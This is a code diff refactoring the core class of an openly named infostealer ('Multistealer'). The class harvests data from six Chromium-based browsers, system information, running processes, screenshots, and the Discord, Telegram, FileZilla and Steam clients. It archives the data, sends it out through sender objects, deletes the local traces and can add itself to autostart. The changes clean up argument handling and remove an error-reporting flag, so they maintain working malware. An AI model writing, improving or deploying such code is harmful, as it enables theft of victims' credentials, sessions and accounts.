@@ -16,11 +16,19 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self, senders: list = [], features: list = [Features.all], utils: list = []):
+    def __init__(self, senders=None, features=None, utils=None):
         Thread.__init__(self, name="Stealer")
 
+        if utils is None:
+            utils = []
+
+        if senders is None:
+            senders = []
+
+        if features is None:
+            features = [Features.all]
+
         self.__senders = senders
-        self.__errors = True if Utils.errors in utils else False
         self.__autostart = True if Utils.autostart in utils else False
         self.__message = True if Utils.message in utils else False
 
@@ -42,9 +50,9 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.CHROME.value,
                     self.__config.StoragePath,
-                    *self.__config.ChromePaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.ChromePaths[0],
+                    self.__config.ChromePaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
@@ -52,9 +60,9 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.OPERA_GX.value,
                     self.__config.StoragePath,
-                    *self.__config.OperaGXPaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.OperaGXPaths[0],
+                    self.__config.OperaGXPaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
@@ -62,9 +70,9 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.OPERA_DEFAULT.value,
                     self.__config.StoragePath,
-                    *self.__config.OperaDefaultPaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.OperaDefaultPaths[0],
+                    self.__config.OperaDefaultPaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
@@ -72,9 +80,9 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.EDGE.value,
                     self.__config.StoragePath,
-                    *self.__config.MicrosoftEdgePaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.MicrosoftEdgePaths[0],
+                    self.__config.MicrosoftEdgePaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
@@ -82,9 +90,9 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.BRAVE.value,
                     self.__config.StoragePath,
-                    *self.__config.BravePaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.BravePaths[0],
+                    self.__config.BravePaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
@@ -92,65 +100,58 @@ class Stealer(Thread):
                 "object": Chromium(
                     Browsers.VIVALDI.value,
                     self.__config.StoragePath,
-                    *self.__config.VivaldiPaths,
-                    browser_functions,
-                    self.__errors
+                    self.__config.VivaldiPaths[0],
+                    self.__config.VivaldiPaths[1],
+                    browser_functions
                 ),
                 "status": browser_statuses
             },
             {
                 "object": System(
                     self.__config.StoragePath,
-                    "System",
-                    self.__errors
+                    "System"
                 ),
                 "status": True if (Features.system in features or Features.all in features) else False
             },
             {
                 "object": Processes(
                     self.__config.StoragePath,
-                    "System",
-                    self.__errors
+                    "System"
                 ),
                 "status": True if (Features.processes in features or Features.all in features) else False
             },
             {
                 "object": Screenshot(
                     self.__config.StoragePath,
-                    "System",
-                    self.__errors
+                    "System"
                 ),
                 "status": True if (Features.screenshot in features or Features.all in features) else False
             },
             {
                 "object": Discord(
                     self.__config.StoragePath,
-                    r"Programs\Discord",
-                    self.__errors
+                    r"Programs\Discord"
                 ),
                 "status": True if (Features.discord in features or Features.all in features) else False
             },
             {
                 "object": Telegram(
                     self.__config.StoragePath,
-                    r"Programs\Telegram",
-                    self.__errors
+                    r"Programs\Telegram"
                 ),
                 "status": True if (Features.telegram in features or Features.all in features) else False
             },
             {
                 "object": FileZilla(
                     self.__config.StoragePath,
-                    r"Programs\FileZilla",
-                    self.__errors
+                    r"Programs\FileZilla"
                 ),
                 "status": True if (Features.filezilla in features or Features.all in features) else False
             },
             {
                 "object": Steam(
                     self.__config.StoragePath,
-                    r"Programs\Steam",
-                    self.__errors
+                    r"Programs\Steam"
                 ),
                 "status": True if (Features.steam in features or Features.all in features) else False
             }
@@ -201,15 +202,15 @@ class Stealer(Thread):
             self.__create_archive()
 
             for sender in self.__senders:
-                sender.run(self.__config.ZipName, self.__config.StoragePath, self.__errors)
+                sender.run(self.__config.ZipName, self.__config.StoragePath)
 
             self.__delete_files()
 
             if self.__autostart is True:
-                Autostart(argv[0], self.__errors).run()
+                Autostart(argv[0]).run()
 
             if self.__message is True:
-                Message(self.__errors).run()
+                Message().run()
 
         except Exception as e:
-            if self.__errors is True: print(f"[Multistealer]: {repr(e)}")
+            print(f"[Multistealer]: {repr(e)}")
